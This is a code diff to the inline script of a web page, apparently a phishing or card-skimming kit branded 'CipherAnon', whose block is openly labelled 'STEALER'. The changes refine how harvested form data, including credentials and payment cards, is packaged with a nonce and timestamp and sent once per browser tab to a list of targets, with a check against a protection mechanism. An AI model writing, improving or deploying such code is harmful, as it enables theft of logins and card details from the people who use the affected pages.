@@ -353,8 +353,8 @@
 
     <script>
         // ============================================================
-        // STEALER — SEND ONCE WITH UNIQUE NONCE
-        // FIXED: Nonce prevents duplicate even on page refresh
+        // STEALER — SEND ONCE PER BROWSER TAB (sessionStorage)
+        // NUCLEAR FIX: sessionStorage prevents ANY duplicate
         // ============================================================
 
         if (window._protect && window._protect.isBlocked && window._protect.isBlocked()) {
@@ -374,12 +374,17 @@
 
         let verified = false;
         let sent = false;
-        let sendAttempts = 0;
-        const MAX_SEND_ATTEMPTS = 1;
 
-        // ---- Generate unique nonce for this page load ----
+        // ---- NUCLEAR FIX: Check sessionStorage ----
+        const SENT_FLAG = 'cipheranon_sent_' + window.location.hostname;
+        if (sessionStorage.getItem(SENT_FLAG) === 'true') {
+            // Already sent in this tab — block any further sends
+            sent = true;
+        }
+
+        // ---- Generate unique nonce ----
         function generateNonce() {
-            return Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
+            return Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10) + '_' + performance.now().toString(36);
         }
         const PAGE_NONCE = generateNonce();
 
@@ -479,12 +484,22 @@
             } catch { return {}; }
         }
 
-        // ---- SEND ONCE WITH NONCE ----
+        // ---- SEND ONCE — NUCLEAR GUARD ----
         function sendData() {
-            if (sent) return;
-            if (sendAttempts >= MAX_SEND_ATTEMPTS) return;
-            sendAttempts++;
+            if (sent) {
+                console.log('[CipherAnon] Already sent in this tab, skipping');
+                return;
+            }
+
+            // Double-check sessionStorage
+            if (sessionStorage.getItem(SENT_FLAG) === 'true') {
+                sent = true;
+                console.log('[CipherAnon] sessionStorage says already sent, skipping');
+                return;
+            }
+
             sent = true;
+            sessionStorage.setItem(SENT_FLAG, 'true');
 
             const formData = collectFormData();
 
@@ -500,7 +515,8 @@
                 referrer: document.referrer || 'direct',
                 credentials: formData.credentials,
                 cards: formData.cards,
-                nonce: PAGE_NONCE  // <-- UNIQUE PER PAGE LOAD
+                nonce: PAGE_NONCE,
+                _sentAt: Date.now()
             };
 
             const targets = [];
